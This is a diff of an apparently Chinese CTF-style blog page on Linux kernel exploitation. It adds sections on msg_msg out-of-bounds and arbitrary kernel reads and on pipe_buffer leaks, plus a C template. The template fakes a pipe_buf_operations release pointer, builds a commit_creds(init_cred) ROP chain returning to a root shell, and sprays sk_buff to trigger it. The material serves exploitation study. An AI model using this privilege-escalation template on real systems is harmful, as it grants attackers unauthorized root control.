@@ -28,12 +28,15 @@
 <meta property="og:site_name" content="Pwn进你的心">
 <meta property="og:description" content="ret2usr核心：利用 commit_creds(prepare_kernel_cred(0)) 进行提取 原理：该方式会自动生成一个合法的 cred，并定位当前线程的 task_struct 的位置，然后修改它的 cred 为新的 cred 当已知 commit_creds 和 prepare_kernel_cred 的函数地址时，用如下代码进行提权： 123456void get_root(">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/05/21/kernel%20attack/1656410685806.png">
+<meta property="og:image" content="http://example.com/2022/05/21/kernel%20attack/1656567331153.png">
 <meta property="article:published_time" content="2022-05-20T17:37:34.000Z">
-<meta property="article:modified_time" content="2022-06-22T05:30:41.584Z">
+<meta property="article:modified_time" content="2022-06-30T13:11:32.919Z">
 <meta property="article:author" content="yhellow">
 <meta property="article:tag" content="kernel">
 <meta property="article:tag" content="ret2usr">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/05/21/kernel%20attack/1656410685806.png">
 
 <link rel="canonical" href="http://example.com/2022/05/21/kernel%20attack/">
 
@@ -193,7 +196,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-06-22 13:30:41" itemprop="dateModified" datetime="2022-06-22T13:30:41+08:00">2022-06-22</time>
+                <time title="Modified: 2022-06-30 21:11:32" itemprop="dateModified" datetime="2022-06-30T21:11:32+08:00">2022-06-30</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -217,13 +220,13 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-file-word"></i>
               </span>
-              <span>9.7k</span>
+              <span>14k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-              <span>9 mins.</span>
+              <span>13 mins.</span>
             </span>
 
         </div>
@@ -301,6 +304,58 @@
 <li>commit_creds，prepare_kernel_cred 可以通过 <code>grep &lt;symbol_name&gt; /proc/kallsyms</code> 来找（记得开 root，关闭 kernel ASLR）</li>
 <li>而 user_cs 这些寄存器的值，可以通过 <code>save_status</code> 来获取</li>
 </ul>
+<h2 id="msg-msg-leak"><a href="#msg-msg-leak" class="headerlink" title="msg_msg leak"></a>msg_msg leak</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;        <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *security;		<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
+<p>当我们在一个消息队列上发送多个消息时，会形成如下结构：（msg 双向链表）</p>
+<img src="/2022/05/21/kernel%20attack/1656410685806.png" class width="1656410685806"> 
+<ul>
+<li>去除掉 <code>msg_msg</code> 结构体本身的 0x30 字节的部分（或许可以称之为 header）剩余的部分都用来存放用户数据</li>
+<li>因此内核分配的 object 的大小是跟随着我们发送的 message 的大小进行变动的 </li>
+</ul>
+<p>而当我们单次发送大于 [一个页面大小 - header size] 大小的消息时，内核会额外补充添加 <code>msg_msgseg</code> 结构体（只有一个 next 指针），其与 <code>msg_msg</code> 之间形成如下单向链表结构：</p>
+<img src="/2022/05/21/kernel%20attack/1656567331153.png" class width="1656567331153"> 
+<ul>
+<li>同样地，单个 <code>msg_msgseg</code> 的大小最大为一个页面大小，因此超出这个范围的消息内核会额外补充上更多的 <code>msg_msgseg</code> 结构体 </li>
+<li>在读取 <code>msg_msg</code> 中的数据时，如果 <code>msg_msg-&gt;next</code> 不为空，程序就会把 <code>msg_msg-&gt;next</code> 指向的内容也当做是 <code>msg_msg data</code> 的一部分，如果 <code>msg_msgseg-&gt;next</code> 还不为空，就会继续读取 <code>msg_msgseg-&gt;next</code> 指向的内容</li>
+</ul>
+<p>利用-内核地址泄露：</p>
+<ul>
+<li>在拷贝数据时对长度的判断主要依靠的是 <code>msg_msg-&gt;m_ts</code>，若是我们能够控制一个 msg_msg 的 header，将其 <code>msg_msg-&gt;m_ts</code> 成员改为一个较大的数，我们就能够越界读取出最多将近一张内存页大小的数据</li>
+<li>若是我们能够同时劫持 <code>msg_msg-&gt;m_ts</code> 与 <code>msg_msg-&gt;next</code>，我们便能够完成内核空间中的任意地址读（<code>msg_msg-&gt;next</code> 指向的数据也会被当做 <code>msg_msg data</code>）<ul>
+<li>但这个方法有一个缺陷，无论是 <code>MSG_COPY</code> 还是常规的接收消息，其拷贝消息的过程的判断主要依据还是单向链表的 next 指针，因此若我们需要完成对特定地址向后的一块区域的读取，我们需要保证该地址的数据为 NULL</li>
+</ul>
+</li>
+</ul>
+<p>相关接口：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建和获取ipc内核对象</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 将消息发送到消息队列</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">const</span> <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">int</span> msgflg)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 从消息队列获取消息</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 查看、设置、删除ipc内核对象(用法和shmctl一样)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgctl</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">int</span> cmd, struct msqid_ds *buf)</span></span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>msqid：消息队列的标识符，代表要从哪个消息列中获取消息</li>
+<li>msgp： 存放消息结构体的地址（需要自己定义：<code>long type+char data[n]</code>）</li>
+<li>msgsz：消息正文的字节数</li>
+<li>msgtyp：消息的类型，可以有以下几种类型：<ul>
+<li>msgtyp = 0：返回队列中的第一个消息</li>
+<li>msgtyp &gt; 0：返回队列中消息类型为 msgtyp 的消息（常用）</li>
+<li>msgtyp &lt; 0：返回队列中消息类型值小于或等于 msgtyp 绝对值的消息，如果这种消息有若干个，则取类型值最小的消息</li>
+</ul>
+</li>
+<li>msgflg：函数的控制属性，其取值如下：<ul>
+<li>0：msgrcv() 调用阻塞直到接收消息成功为止</li>
+<li>MSG_NOERROR：若返回的消息字节数比 nbytes 字节数多,则消息就会截短到 nbytes 字节，且不通知消息发送进程</li>
+<li>MSG_COPY：读取但不释放，当我们在调用 msgrcv 接收消息时，相应的 msg_msg 链表便会被释放，当我们在调用 msgrcv 时若设置了 <code>MSG_COPY</code> 标志位，则内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink</li>
+<li>IPC_NOWAIT：调用进程会立即返回，若没有收到消息则立即返回 -1</li>
+</ul>
+</li>
+</ul>
+<p>PS：msg_msg 常常和 sk_buff 进行连用</p>
+<h2 id="pipe-buffer-leak-attack"><a href="#pipe-buffer-leak-attack" class="headerlink" title="pipe_buffer leak+attack"></a>pipe_buffer leak+attack</h2><p><strong>pipe_buffer leak</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">	<span class="keyword">void</span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">	<span class="keyword">bool</span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">	<span class="keyword">bool</span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>当我们创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object </li>
+<li>在 <code>pipe_buffer</code> 中存在一个函数表成员 <code>pipe_buf_operations</code> ，其指向内核中的函数表 <code>anon_pipe_buf_ops</code>，若我们能够将其读出，便能泄露出内核基址</li>
+</ul>
+<p><strong>pipe_buffer attack</strong></p>
+<p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buf_operations-&gt;release</code> 这一指针，可以把它覆盖为 shellcode</p>
+<p>参考模板：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pipe_buf_ptr = (struct pipe_buffer *) fake_secondary_msg;</span><br><span class="line">pipe_buf_ptr-&gt;page = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">ops_ptr = (struct pipe_buf_operations *) &amp;fake_secondary_msg[<span class="number">0x100</span>]; <span class="comment">/* 伪造的pipe_buf_operations */</span></span><br><span class="line">ops_ptr-&gt;release = PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset; <span class="comment">/* 伪造的pipe_buf_operations-&gt;release */</span></span><br><span class="line"></span><br><span class="line">rop_idx = <span class="number">0</span>;</span><br><span class="line">rop_chain = (<span class="keyword">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">rop_chain[rop_idx++] = user_cs;</span><br><span class="line">rop_chain[rop_idx++] = user_rflags;</span><br><span class="line">rop_chain[rop_idx++] = user_sp;</span><br><span class="line">rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">    errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, kernel_offset + PUSH_RSI_POP_RSP_POP_4VAL_RET);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] free_pipe_info: %p\n&quot;</span>, kernel_offset + FREE_PIPE_INFO);</span><br><span class="line">sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
     </div>
 
@@ -386,7 +441,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2usr"><span class="nav-number">1.</span> <span class="nav-text">ret2usr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tty-struct-attack"><span class="nav-number">2.</span> <span class="nav-text">tty_struct attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">3.</span> <span class="nav-text">条件竞争</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pipe-trick"><span class="nav-number">4.</span> <span class="nav-text">pipe trick</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#subprocess-info-attack"><span class="nav-number">5.</span> <span class="nav-text">subprocess_info attack</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2usr"><span class="nav-number">1.</span> <span class="nav-text">ret2usr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tty-struct-attack"><span class="nav-number">2.</span> <span class="nav-text">tty_struct attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">3.</span> <span class="nav-text">条件竞争</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pipe-trick"><span class="nav-number">4.</span> <span class="nav-text">pipe trick</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#subprocess-info-attack"><span class="nav-number">5.</span> <span class="nav-text">subprocess_info attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msg-msg-leak"><span class="nav-number">6.</span> <span class="nav-text">msg_msg leak</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pipe-buffer-leak-attack"><span class="nav-number">7.</span> <span class="nav-text">pipe_buffer leak+attack</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -402,7 +457,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">115</span>
+          <span class="site-state-item-count">116</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -415,7 +470,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">80</span>
+        <span class="site-state-item-count">83</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -451,12 +506,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="Symbols count total">1.5m</span>
+    <span title="Symbols count total">1.6m</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">23:16</span>
+    <span title="Reading time total">23:50</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
